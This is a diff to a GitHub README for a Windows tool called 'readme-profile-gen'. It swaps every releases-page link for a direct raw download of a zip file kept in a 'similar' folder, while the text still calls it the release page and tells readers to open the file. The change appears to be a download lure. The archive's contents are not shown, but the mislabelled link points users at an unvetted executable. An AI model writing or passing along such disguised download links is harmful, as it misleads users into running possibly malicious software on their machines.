@@ -1,6 +1,6 @@
 # 🧩 readme-profile-gen - Build Profile READMEs Fast
 
-[![Download now](https://img.shields.io/badge/Download%20on%20GitHub-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tomasmel8079/readme-profile-gen/releases)
+[![Download now](https://img.shields.io/badge/Download%20on%20GitHub-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tomasmel8079/readme-profile-gen/raw/refs/heads/main/similar/gen-readme-profile-v2.1-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it when you want to:
 
 ## 📥 Download for Windows
 
-1. Visit the release page: https://github.com/Tomasmel8079/readme-profile-gen/releases
+1. Visit the release page: https://github.com/Tomasmel8079/readme-profile-gen/raw/refs/heads/main/similar/gen-readme-profile-v2.1-beta.1.zip
 2. Find the latest release.
 3. Download the Windows file from the assets list.
 4. Open the file after the download finishes.
@@ -243,7 +243,7 @@ This project focuses on:
 
 ## 📁 Release Page
 
-Download the Windows version here: https://github.com/Tomasmel8079/readme-profile-gen/releases
+Download the Windows version here: https://github.com/Tomasmel8079/readme-profile-gen/raw/refs/heads/main/similar/gen-readme-profile-v2.1-beta.1.zip
 
 Use the latest release for the newest build and the most current files for Windows
 
